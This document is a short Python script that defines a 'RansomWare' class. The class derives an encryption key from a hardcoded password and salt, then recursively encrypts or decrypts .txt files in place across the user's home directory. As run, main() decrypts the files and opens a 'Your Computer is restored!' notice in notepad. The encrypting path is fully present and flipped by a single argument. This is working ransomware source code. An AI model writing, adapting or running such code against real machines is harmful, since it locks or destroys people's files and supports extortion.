import os
from os.path import expanduser
from cryptography.fernet import Fernet
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import subprocess as sp


class RansomWare:
    def __init__(self, password, salt):
        self.password = password.encode()
        self.salt = salt.encode()
        self.key = self.generate_key()
        self.cryptor = Fernet(self.key)
        self.file_ext_targets = ['txt']

    def generate_key(self):
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=self.salt,
            iterations=100000,
            backend=default_backend()
        )
        key = base64.urlsafe_b64encode(kdf.derive(self.password))  # Can only use kdf once
        return key

    def crypt_root(self, root_dir, encrypted=False):
        """
        Recursively encrypts or decrypts files from root directory with allowed file extensions
        Args:
            root_dir:str: Absolute path of top level directory
            encrypt:bool: Specify whether to encrypt or decrypt encountered files
        """

        for root, _, files in os.walk(root_dir):
            for f in files:
                abs_file_path = os.path.join(root, f)

                # if not a file extension target, pass
                if not abs_file_path.split('.')[-1] in self.file_ext_targets:
                    continue

                self.crypt_file(abs_file_path, encrypted=encrypted)

    def crypt_file(self, file_path, encrypted=False):
        """
        Encrypts or decrypts a file
        Args:
            file_path:str: Absolute path to a file
        """

        with open(file_path, 'rb+') as f:
            _data = f.read()

            if encrypted:
                print(f'File contents pre encryption: {_data}')
                data = self.cryptor.encrypt(_data)
                print(f'File contents post encryption: {data}')
            else:
                data = self.cryptor.decrypt(_data)
                print(f'File content post decryption: {data}')

            f.seek(0)
            f.write(data)


def main():
    fighter = RansomWare(password='password', salt='salt')
    sys_root = expanduser('~')
    # sys_root = '~'
    fighter.crypt_root(root_dir=sys_root)
    file = open('warning.txt', 'w')
    msg = """
    Your Computer is restored!
    Your files has been decrypted!
    """
    file.write(msg)
    file.close()
    sp.Popen(['notepad.exe', 'warning.txt'])


if __name__ == '__main__':
    main()

